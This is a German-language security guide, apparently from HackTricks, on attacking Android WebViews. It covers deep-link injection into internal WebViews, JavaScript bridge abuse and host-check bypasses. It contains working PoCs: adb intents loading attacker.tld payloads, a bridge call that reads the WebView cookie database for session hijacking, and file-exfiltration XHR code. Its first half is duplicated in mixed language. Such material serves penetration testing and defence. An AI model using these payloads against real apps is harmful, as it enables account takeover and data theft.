# Webview Angriffe

{{#include ../../banners/hacktricks-training.md}}

## Leitfaden zu WebView-Konfigurationen und Sicherheit

### Übersicht über WebView-Schwachstellen

Ein kritischer Aspekt der Android-Entwicklung ist der korrekte Umgang mit WebViews. Dieser Leitfaden hebt wichtige Konfigurationen und Sicherheitspraktiken hervor, um Risiken im Zusammenhang mit der Nutzung von WebViews zu mindern.

![WebView Beispiel](<../../images/image (1190).png>)

### **Dateizugriff in WebViews**

Standardmäßig erlauben WebViews Dateizugriff. Diese Funktion wird durch die Methode `setAllowFileAccess()` gesteuert, verfügbar seit Android API level 3 (Cupcake 1.5). Anwendungen mit der Berechtigung **android.permission.READ_EXTERNAL_STORAGE** können Dateien vom externen Speicher über das file-URL-Schema (`file://path/to/file`) lesen.

#### **Veraltete Funktionen: Universal- und Datei-Zugriff von URLs**

- **Universal Access From File URLs**: Diese veraltete Funktion erlaubte Cross-Origin-Anfragen von file-URLs und stellte ein erhebliches Sicherheitsrisiko wegen potenzieller XSS-Angriffe dar. Die Standardeinstellung ist deaktiviert (`false`) für Apps, die auf Android Jelly Bean und neuer abzielen.
- Zur Überprüfung dieser Einstellung verwenden Sie `getAllowUniversalAccessFromFileURLs()`.
- Zum Ändern dieser Einstellung verwenden Sie `setAllowUniversalAccessFromFileURLs(boolean)`.
- **File Access From File URLs**: Diese ebenfalls veraltete Funktion regelte den Zugriff auf Inhalte von anderen file-Schema-URLs. Wie beim Universalzugriff ist die Standardeinstellung aus Sicherheitsgründen deaktiviert.
- Verwenden Sie `getAllowFileAccessFromFileURLs()` zur Überprüfung und `setAllowFileAccessFromFileURLs(boolean)` zum Setzen.

#### **Sicheres Laden von Dateien**

Um den Zugriff auf das Dateisystem zu deaktivieren und dennoch auf assets und resources zuzugreifen, wird die Methode `setAllowFileAccess()` verwendet. Unter Android R und höher ist die Standardeinstellung `false`.

- Überprüfen mit `getAllowFileAccess()`.
- Aktivieren oder Deaktivieren mit `setAllowFileAccess(boolean)`.

#### **WebViewAssetLoader**

Die Klasse **WebViewAssetLoader** ist der moderne Ansatz zum Laden lokaler Dateien. Sie verwendet http(s)-URLs zum Zugriff auf lokale assets und resources, richtet sich an die Same-Origin-Policy aus und erleichtert damit das CORS-Management.

### loadUrl

Dies ist eine häufig verwendete Funktion, um beliebige URLs in einer WebView zu laden:
```java
webview.loadUrl("<url here>")
```
Natürlich sollte ein potenzieller Angreifer niemals in der Lage sein, **die URL zu kontrollieren**, die eine Anwendung laden wird.

### **JavaScript- und Intent-Scheme-Verarbeitung**

- **JavaScript**: Standardmäßig in WebViews deaktiviert, kann es über `setJavaScriptEnabled()` aktiviert werden. Vorsicht ist geboten, da das Aktivieren von JavaScript ohne geeignete Schutzmaßnahmen Sicherheitslücken einführen kann.
- **Intent Scheme**: WebViews können das `intent`-Schema verarbeiten, was potenziell zu Exploits führen kann, wenn es nicht sorgfältig gehandhabt wird. Ein Beispiel für eine Schwachstelle betraf einen exponierten WebView-Parameter "support_url", der ausgenutzt werden konnte, um cross-site scripting (XSS)-Angriffe auszuführen.

![Vulnerable WebView](<../../images/image (1191).png>)

Ausbeutungsbeispiel mit adb:
```bash
adb.exe shell am start -n com.tmh.vulnwebview/.SupportWebView –es support_url "https://example.com/xss.html"
```
### Javascript Bridge

Eine von Android bereitgestellte Funktion ermöglicht es, dass **JavaScript** in einer WebView **native Android-App-Funktionen** aufruft. Dies wird durch die Nutzung der Methode `addJavascriptInterface` erreicht, die JavaScript mit nativen Android-Funktionalitäten integriert und als _WebView JavaScript bridge_ bezeichnet wird. Vorsicht ist geboten, da diese Methode allen Seiten innerhalb der WebView Zugriff auf das registrierte JavaScript Interface-Objekt gewährt, was ein Sicherheitsrisiko darstellt, wenn über diese Interfaces sensible Informationen exponiert werden.

- **Äußerste Vorsicht ist geboten** für Apps, die auf Android versions below 4.2 abzielen, da eine Schwachstelle remote code execution durch malicious JavaScript ermöglicht und reflection ausnutzt.

#### Implementing a JavaScript Bridge

- **JavaScript interfaces** können mit nativen Code interagieren, wie in den Beispielen gezeigt, in denen eine Klassenmethode für JavaScript exponiert wird:
```javascript
@JavascriptInterface
public String getSecret() {
return "SuperSecretPassword";
};
```
- JavaScript Bridge wird aktiviert, indem eine Schnittstelle zum WebView hinzugefügt wird:
```javascript
webView.addJavascriptInterface(new JavascriptBridge(), "javascriptBridge")
webView.reload()
```
- Potenzielle Ausnutzung durch JavaScript, zum Beispiel mittels eines XSS-Angriffs, ermöglicht das Aufrufen exponierter Java-Methoden:
```html
<script>
alert(javascriptBridge.getSecret())
</script>
```
- Um Risiken zu mindern, beschränken Sie die Nutzung der **JavaScript-bridge** auf Code, der mit dem APK ausgeliefert wird, und verhindern Sie das Laden von JavaScript aus entfernten Quellen. Für ältere Geräte setzen Sie das minimale API level auf 17.

### Reflection-based Remote Code Execution (RCE)

- Eine dokumentierte Methode ermöglicht das Erreichen von RCE durch Reflection, indem ein bestimmter Payload ausgeführt wird. Allerdings verhindert die Annotation `@JavascriptInterface` unautorisierten Methoden-Zugriff und begrenzt so die Angriffsfläche.

### Remote Debugging

- **Remote debugging** ist mit **Chrome Developer Tools** möglich und erlaubt Interaktion sowie beliebige JavaScript-Ausführung innerhalb des WebView-Inhalts.

#### Enabling Remote Debugging

- Remote debugging kann für alle WebViews innerhalb einer Anwendung aktiviert werden durch:
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
WebView.setWebContentsDebuggingEnabled(true);
}
```
- Um debugging abhängig vom debuggable-Status der Anwendung zu aktivieren:
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
if (0 != (getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE))
{ WebView.setWebContentsDebuggingEnabled(true); }
}
```
## Exfiltrate beliebige Dateien

- Demonstriert die exfiltration beliebiger Dateien mittels XMLHttpRequest:
```javascript
var xhr = new XMLHttpRequest()
xhr.onreadystatechange = function () {
if (xhr.readyState == XMLHttpRequest.DONE) {
alert(xhr.responseText)
}
}
xhr.open(
"GET",
"file:///data/data/com.authenticationfailure.wheresmybrowser/databases/super_secret.db",
true
)
xhr.send(null)
```
# Webview Attacks



## Leitfaden zu WebView-Konfigurationen und Sicherheit

### Überblick über WebView-Schwachstellen

Ein kritischer Aspekt der Android-Entwicklung ist der korrekte Umgang mit WebViews. Dieser Leitfaden hebt zentrale Konfigurationen und Sicherheitspraktiken hervor, um Risiken bei der Verwendung von WebView zu mindern.

![WebView-Beispiel](<../../images/image (1190).png>)

### **Dateizugriff in WebViews**

Standardmäßig erlauben WebViews den Dateizugriff. Diese Funktion wird durch die Methode `setAllowFileAccess()` gesteuert, verfügbar seit Android API level 3 (Cupcake 1.5). Anwendungen mit der Berechtigung **android.permission.READ_EXTERNAL_STORAGE** können Dateien aus dem externen Speicher über ein file-URL-Schema (`file://path/to/file`) lesen.

#### **Deprecated Features: Universal and File Access From URLs**

- **Universal Access From File URLs**: Dieses veraltete Feature erlaubte Cross-Origin-Requests von file-URLs und stellte ein erhebliches Sicherheitsrisiko aufgrund möglicher XSS-Angriffe dar. Die Standardeinstellung ist deaktiviert (`false`) für Apps, die auf Android Jelly Bean und neuer abzielen.
- Zur Überprüfung dieser Einstellung `getAllowUniversalAccessFromFileURLs()` verwenden.
- Zur Änderung dieser Einstellung `setAllowUniversalAccessFromFileURLs(boolean)` verwenden.
- **File Access From File URLs**: Dieses ebenfalls veraltete Feature steuerte den Zugriff auf Inhalte von anderen file-Scheme-URLs. Wie beim universal access ist die Standardeinstellung aus Sicherheitsgründen deaktiviert.
- Zur Überprüfung `getAllowFileAccessFromFileURLs()` und zum Setzen `setAllowFileAccessFromFileURLs(boolean)` verwenden.

#### **Sicheres Laden von Dateien**

Um den Zugriff auf das Dateisystem zu deaktivieren und dennoch auf assets und resources zuzugreifen, wird die Methode `setAllowFileAccess()` verwendet. Ab Android R ist die Standardeinstellung `false`.

- Überprüfen mit `getAllowFileAccess()`.
- Aktivieren oder deaktivieren mit `setAllowFileAccess(boolean)`.

#### **WebViewAssetLoader**

Die Klasse **WebViewAssetLoader** ist der moderne Ansatz zum Laden lokaler Dateien. Sie verwendet http(s)-URLs für den Zugriff auf lokale assets und resources, was mit der Same-Origin policy übereinstimmt und somit die CORS-Verwaltung erleichtert.

### loadUrl

Dies ist eine häufig verwendete Funktion, um beliebige URLs in einer WebView zu laden:
```java
webview.loadUrl("<url here>")
```
Natürlich sollte ein potenzieller attacker niemals die **URL kontrollieren** können, die eine Anwendung zu laden beabsichtigt.

### Deep-linking in einem internen WebView (custom scheme → WebView sink)

Viele Apps registrieren custom schemes/paths, die eine vom Nutzer gelieferte URL in ein in-app WebView routen. Wenn der deep link exported ist (VIEW + BROWSABLE), kann ein attacker die App zwingen, beliebige remote Inhalte innerhalb ihres WebView-Kontexts darzustellen.

Typisches Manifest-Muster (vereinfacht):
```xml
<activity android:name=".MainActivity" android:exported="true">
<intent-filter>
<action android:name="android.intent.action.VIEW" />
<category android:name="android.intent.category.DEFAULT" />
<category android:name="android.intent.category.BROWSABLE" />
<data android:scheme="myscheme" android:host="com.example.app" />
</intent-filter>
</activity>
```
Typischer Codefluss (vereinfacht):
```java
// Entry activity
@Override
protected void onNewIntent(Intent intent) {
Uri deeplink = intent.getData();
String url = deeplink.getQueryParameter("url"); // attacker-controlled
if (deeplink.getPathSegments().get(0).equals("web")) {
Intent i = new Intent(this, WebActivity.class);
i.putExtra("url", url);
startActivity(i);
}
}

// WebActivity sink
webView.loadUrl(getIntent().getStringExtra("url"));
```
Angriffsmuster und PoC via adb:
```bash
# Template – force load in internal WebView
adb shell am start -a android.intent.action.VIEW \
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"

# If a specific Activity must be targeted
adb shell am start -n com.example/.MainActivity -a android.intent.action.VIEW \
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"
```
Auswirkung: die entfernte Seite läuft im WebView-Kontext der App (Cookies/Sitzung des App-WebView-Profils, Zugriff auf jede exponierte @JavascriptInterface, potenzieller Zugriff auf content:// und file:// je nach Einstellungen).

Suchhinweise:
- Grep dekompilierte Quellen nach `getQueryParameter("url")`, `loadUrl(`, `WebView` sinks und Deep-Link-Handlern (`onCreate/onNewIntent`).
- Prüfe das Manifest auf VIEW+BROWSABLE-Filter und benutzerdefinierte Schemes/Hosts, die zu Activities führen, die später eine WebView starten.
- Prüfe, ob mehrere Deep-Link-Pfade existieren (z. B. ein “external browser”-Pfad vs. ein “internal webview”-Pfad) und bevorzuge den Pfad, der innerhalb der App gerendert wird.

### Aktivieren von JavaScript vor der Verifizierung (order-of-checks bug)

Ein häufiger Fehler bei der Härtung ist das Aktivieren von JavaScript oder das Konfigurieren gelockerter WebView-Einstellungen, bevor die endgültige Allowlist/Verifizierung der Ziel-URL abgeschlossen ist. Wenn die Verifizierung in verschiedenen Hilfsroutinen inkonsistent ist oder zu spät erfolgt, kann ein Angreifer-Deep-Link einen Zustand erreichen, in dem:

1) WebView-Einstellungen greifen (z. B. `setJavaScriptEnabled(true)`), und
2) die nicht vertrauenswürdige URL mit aktiviertem JavaScript geladen wird.

Fehlermuster (Pseudocode):
```java
// 1) Parse/early checks
Uri u = parse(intent);
if (!looksValid(u)) return;

// 2) Configure WebView BEFORE final checks
webView.getSettings().setJavaScriptEnabled(true); // BAD: too early
configureMixedContent();

// 3) Do final verification (late)
if (!finalAllowlist(u)) return; // too late – JS already enabled

// 4) Load
webView.loadUrl(u.toString());
```
Warum es ausnutzbar ist
- Inkonsistente Normalisierung: Hilfsfunktionen split/rebuild die URL anders als die finale Prüfung, wodurch Abweichungen entstehen, die eine bösartige URL ausnutzen kann.
- Falsch gereihte Pipeline: Das Aktivieren von JS in Schritt 2 gilt global für die WebView-Instanz und beeinflusst das finale Laden, selbst wenn die spätere Verifikation fehlschlägt.

Wie testen
- Erstelle Deep-Link-Payloads, die frühe Prüfungen passieren und die WebView-Konfigurationsseite erreichen.
- Verwende adb, um implicit VIEW intents auszulösen, die einen von dir kontrollierten `url=`-Parameter liefern:
```bash
adb shell am start -a android.intent.action.VIEW \
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"
```
Wenn exploitation erfolgreich ist, führt dein payload JavaScript in der WebView der App aus. Untersuche von dort aus exposed bridges:
```html
<script>
for (let k in window) {
try { if (typeof window[k] === 'object' || typeof window[k] === 'function') console.log('[JSI]', k); } catch(e){}
}
</script>
```
Defensive Hinweise
- Einmal kanonisieren; strikt gegen eine einzige Quelle der Wahrheit validieren (scheme/host/path/query).
- Rufe `setJavaScriptEnabled(true)` nur auf, nachdem alle Allowlist-Prüfungen bestanden sind und unmittelbar bevor vertrauenswürdiger Inhalt geladen wird.
- Vermeide es, `@JavascriptInterface` für nicht vertrauenswürdige Ursprünge freizugeben; bevorzuge eine per-origin Steuerung.
- Ziehe pro-WebView-Instanzen für vertrauenswürdige vs. nicht vertrauenswürdige Inhalte in Betracht, wobei JS standardmäßig deaktiviert sein sollte.

### **JavaScript und Intent Scheme Handling**

- **JavaScript**: In WebViews standardmäßig deaktiviert; es kann über `setJavaScriptEnabled()` aktiviert werden. Vorsicht ist geboten, da das Aktivieren von JavaScript ohne geeignete Schutzmaßnahmen Sicherheitslücken einführen kann.
- **Intent Scheme**: WebViews können das `intent` scheme verarbeiten, was potenziell zu Exploits führen kann, wenn es nicht sorgfältig gehandhabt wird. Ein Beispiel für eine Schwachstelle betraf einen exponierten WebView-Parameter "support_url", der ausgenutzt werden konnte, um Cross-Site-Scripting (XSS)-Angriffe auszuführen.

![Vulnerable WebView](<../../images/image (1191).png>)

Exploitation example using adb:
```bash
adb.exe shell am start -n com.tmh.vulnwebview/.SupportWebView –es support_url "https://example.com/xss.html"
```
### Javascript Bridge

Android stellt eine Funktion bereit, die es ermöglicht, dass **JavaScript** in einer WebView **native Android-App-Funktionen** aufruft. Dies wird durch die Verwendung der Methode `addJavascriptInterface` erreicht, die JavaScript mit nativen Android-Funktionalitäten integriert und als _WebView JavaScript bridge_ bezeichnet wird. Vorsicht ist geboten, da diese Methode allen Seiten innerhalb der WebView Zugriff auf das registrierte JavaScript-Interface-Objekt gewährt, was ein Sicherheitsrisiko darstellt, wenn über diese Schnittstellen sensible Informationen offengelegt werden.

- **Extreme Vorsicht ist geboten** bei Apps, die auf Android-Versionen unter 4.2 abzielen, aufgrund einer Schwachstelle, die remote code execution durch bösartiges JavaScript ermöglicht und reflection ausnutzt.

#### Implementierung einer JavaScript Bridge

- **JavaScript interfaces** können mit nativem Code interagieren, wie in den Beispielen gezeigt, in denen eine Klassenmethode für JavaScript freigegeben wird:
```javascript
@JavascriptInterface
public String getSecret() {
return "SuperSecretPassword";
};
```
- JavaScript Bridge wird aktiviert, indem eine Schnittstelle zum WebView hinzugefügt wird:
```javascript
webView.addJavascriptInterface(new JavascriptBridge(), "javascriptBridge")
webView.reload()
```
- Potenzielle Ausnutzung über JavaScript, zum Beispiel durch einen XSS-Angriff, ermöglicht das Aufrufen von offengelegten Java-Methoden:
```html
<script>
alert(javascriptBridge.getSecret())
</script>
```
- Zur Minderung von Risiken **restrict JavaScript bridge usage** auf Code, der mit der APK ausgeliefert wird, und verhindern Sie das Laden von JavaScript aus entfernten Quellen. Für ältere Geräte setzen Sie das minimum API level auf 17.

#### Ausnutzung dispatcher-artiger JS bridges (invokeMethod/handlerName)

Ein übliches Muster ist eine einzelne exportierte Methode (z. B. `@JavascriptInterface void invokeMethod(String json)`), die vom Angreifer kontrolliertes JSON in ein generisches Objekt deserialisiert und basierend auf einem bereitgestellten handler name dispatcht. Typische JSON-Struktur:
```json
{
"handlerName": "toBase64",
"callbackId": "cb_12345",
"asyncExecute": "true",
"data": { /* handler-specific fields */ }
}
```
Risk: Wenn ein registrierter Handler privilegierte Aktionen auf Angreifer-Daten ausführt (z. B. direkte Dateilesen), können Sie ihn aufrufen, indem Sie `handlerName` entsprechend setzen. Ergebnisse werden normalerweise über `evaluateJavascript` und einen Callback/Promise-Mechanismus mit `callbackId` als Schlüssel in den Seitenkontext zurückgegeben.

Key hunting steps
- Decompile and grep for `addJavascriptInterface(` to learn the bridge object name (e.g., `xbridge`).
- In Chrome DevTools (chrome://inspect), type the bridge object name in the Console (e.g., `xbridge`) to enumerate exposed fields/methods; look for a generic dispatcher like `invokeMethod`.
- Enumerate handlers by searching for classes implementing `getModuleName()` or registration maps.

#### Arbitrary file read via URI → File sinks (Base64 exfiltration)

Wenn ein Handler eine URI entgegennimmt, `Uri.parse(req.getUri()).getPath()` aufruft, `new File(...)` erstellt und diese ohne allowlists oder Sandbox-Prüfungen liest, erhält man ein beliebiges Dateilesen innerhalb der App-Sandbox, das WebView-Einstellungen wie `setAllowFileAccess(false)` umgeht (das Lesen erfolgt im nativen Code, nicht über den WebView-Netzwerkstack).

PoC to exfiltrate the Chromium WebView cookie DB (session hijack):
```javascript
// Minimal callback sink so native can deliver the response
window.WebViewJavascriptBridge = {
_handleMessageFromObjC: function (data) { console.log(data) }
};

const payload = JSON.stringify({
handlerName: 'toBase64',
callbackId: 'cb_' + Date.now(),
data: { uri: 'file:///data/data/<pkg>/app_webview/Default/Cookies' }
});

xbridge.invokeMethod(payload);
```
Notes
- Cookie DB-Pfade variieren je nach Gerät/Provider. Häufige sind:
- `file:///data/data/<pkg>/app_webview/Default/Cookies`
- `file:///data/data/<pkg>/app_webview_<pkg>/Default/Cookies`
- Der Handler gibt Base64 zurück; dekodiere, um Cookies wiederherzustellen und dich im WebView-Profil der App als der Benutzer auszugeben.

Detection tips
- Achte auf große Base64-Strings, die über `evaluateJavascript` zurückgegeben werden, während du die App benutzt.
- Grep dekompilierte Quellen nach Handlern, die `uri`/`path` akzeptieren und diese in `new File(...)` konvertieren.

#### Bypassing WebView privilege gates – endsWith() host checks

Privilegienentscheidungen (Auswahl einer JSB-enabled Activity) beruhen oft auf Host-Allowlists. Ein fehlerhaftes Muster ist:
```java
String host = Uri.parse(url).getHost();
boolean z = true;
if (!host.endsWith(".trusted.com")) {
if (!".trusted.com".endsWith(host)) {
z = false;
}
}
// z==true → open privileged WebView
```
Äquivalente Logik (De Morgansche Gesetze):
```java
boolean z = host.endsWith(".trusted.com") ||
".trusted.com".endsWith(host);
```
Das ist keine Origin-Prüfung. Viele unbeabsichtigte Hosts erfüllen die zweite Klausel und lassen so nicht vertrauenswürdige Domains in die privilegierte Activity. Überprüfe stets scheme und host anhand einer strikten Allowlist (exakter Vergleich oder eine korrekte Subdomain-Prüfung mit Punkt-Grenzen), nicht mit `endsWith`-Tricks.

#### javascript:// execution primitive via loadUrl

Sobald sich eine App in einer privilegierten WebView befindet, führt sie manchmal inline JS über:
```java
webView.loadUrl("javascript:" + jsPayload);
```
If an internal flow triggers `loadUrl("javascript:...")` in that context, injected JS executes with bridge access even if the external page wouldn’t normally be allowed. Pentest steps:
- Grep for `loadUrl("javascript:` and `evaluateJavascript(` in the app.
- Try to reach those code paths after forcing navigation to the privileged WebView (e.g., via a permissive deep link chooser).
- Use the primitive to call the dispatcher (`xbridge.invokeMethod(...)`) and reach sensitive handlers.

Mitigations (developer checklist)
- Strikte Origin-Überprüfung für privilegierte Activities: canonicalize und vergleiche scheme/host gegen eine explizite allowlist; vermeide `endsWith`-basierte Checks. Berücksichtige Digital Asset Links, wenn anwendbar.
- Scope bridges nur auf vertrauenswürdige Seiten und überprüfe das Vertrauen bei jedem Aufruf neu (per-call authorization).
- Entferne oder schütze filesystem-fähige Handler strikt; bevorzuge `content://` mit allowlists/Permissions gegenüber rohen `file://`-Pfaden.
- Vermeide `loadUrl("javascript:")` in privilegierten Kontexten oder sperre es hinter starken Checks.
- Beachte, dass `setAllowFileAccess(false)` nicht gegen native Dateilesungen via Bridge schützt.

#### JSB enumeration and debugging tips

- Enable WebView remote debugging to use Chrome DevTools Console:
- App-seitig (Debug-Builds): `WebView.setWebContentsDebuggingEnabled(true)`
- System-seitig: Module wie [LSPosed](https://github.com/LSPosed/LSPosed) oder Frida-Skripte können Debugging erzwingen, selbst in Release-Builds. Beispiel Frida-Snippet für Cordova WebViews: [cordova enable webview debugging](http://codeshare.frida.re/@gameFace22/cordova---enable-webview-debugging/)
- In DevTools den Bridge-Objektnamen (z. B. `xbridge`) eingeben, um exponierte Members zu sehen und den Dispatcher zu prüfen.


### Reflection-based Remote Code Execution (RCE)

- A documented method allows achieving RCE through reflection by executing a specific payload. However, the `@JavascriptInterface` annotation prevents unauthorized method access, limiting the attack surface.

### Remote Debugging

- **Remote debugging** is possible with **Chrome Developer Tools**, enabling interaction and arbitrary JavaScript execution within the WebView content.

#### Enabling Remote Debugging

- Remote debugging can be enabled for all WebViews within an application by:
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
WebView.setWebContentsDebuggingEnabled(true);
}
```
- Um debugging bedingt zu aktivieren, basierend auf dem debuggable Zustand der Anwendung:
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
if (0 != (getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE))
{ WebView.setWebContentsDebuggingEnabled(true); }
}
```
## Exfiltrate beliebige Dateien

- Demonstriert die exfiltration beliebiger Dateien mit einem XMLHttpRequest:
```javascript
var xhr = new XMLHttpRequest()
xhr.onreadystatechange = function () {
if (xhr.readyState == XMLHttpRequest.DONE) {
alert(xhr.responseText)
}
}
xhr.open(
"GET",
"file:///data/data/com.authenticationfailure.wheresmybrowser/databases/super_secret.db",
true
)
xhr.send(null)
```
## Quellen

- [Überblick über Android WebViews file access attack vectors](https://labs.integrity.pt/articles/review-android-webviews/fileaccess-attack-vectors/index.html)
- [WheresMyBrowser.Android (Demo-App)](https://github.com/authenticationfailure/WheresMyBrowser.Android)
- [Android WebView-Referenz](https://developer.android.com/reference/android/webkit/WebView)
- [Deep Links & WebViews Exploitations – Part II](https://medium.com/@justmobilesec/deep-links-webviews-exploitations-part-ii-5c0b118ec6f1)
- [Deep Links & WebViews Exploitations – Part I](https://www.justmobilesec.com/en/blog/deep-links-webviews-exploitations-part-I)
- [Samsung S24 Exploit Chain Pwn2Own 2024 Walkthrough](https://medium.com/@happyjester80/samsung-s24-exploit-chain-pwn2own-2024-walkthrough-c7a3da9a7a26)
- [Pwn2Own Ireland 2024 – Samsung S24 attack chain (whitepaper)](https://maliciouserection.com/2025/05/13/pwn2own-ireland-2024-samsung-s24-attack-chain-whitepaper.html)
- [Demonstrationsvideo](https://www.youtube.com/watch?v=LAIr2laU-So)
- [Account takeover in Android-App via JSB – tuxplorer.com](https://tuxplorer.com/posts/account-takeover-via-jsb/)
- [LSPosed – systemless Xposed framework](https://github.com/LSPosed/LSPosed)
- [Frida codeshare: Cordova – enable WebView debugging](http://codeshare.frida.re/@gameFace22/cordova---enable-webview-debugging/)

{{#include ../../banners/hacktricks-training.md}}
